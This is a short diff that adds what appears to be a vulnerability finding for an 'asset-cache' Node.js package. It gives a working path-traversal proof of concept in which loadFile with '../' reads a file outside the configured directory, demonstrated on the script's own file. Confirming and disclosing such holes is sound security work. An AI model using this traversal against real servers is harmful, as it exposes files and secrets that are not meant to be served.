@@ -1,0 +1,25 @@
+Confirmed: `loadFile` builds the path with `path.join(config.dir, filename)` with no sanitization, allowing `../` traversal to read arbitrary files outside the configured directory.
+
+```javascript
+const path = require("path");
+const fs = require("fs");
+const server = require("./node_modules/asset-cache");
+
+// Restrict the asset dir to a harmless subfolder.
+const publicDir = path.join(__dirname, "public");
+fs.mkdirSync(publicDir, { recursive: true });
+server.setCwd(publicDir);
+
+// Path traversal: escape the configured "public" dir to read an arbitrary
+// file elsewhere on disk (here, this very exploit script) via loadFile().
+const traversal = "../" + path.relative(publicDir, __filename).split(path.sep).join("/");
+
+server.loadFile(traversal, null, (err, data) => {
+  if (err) {
+    console.error("Error:", err);
+    return;
+  }
+  console.log("Traversal succeeded, leaked file contents:\n");
+  console.log(data.toString());
+});
+```
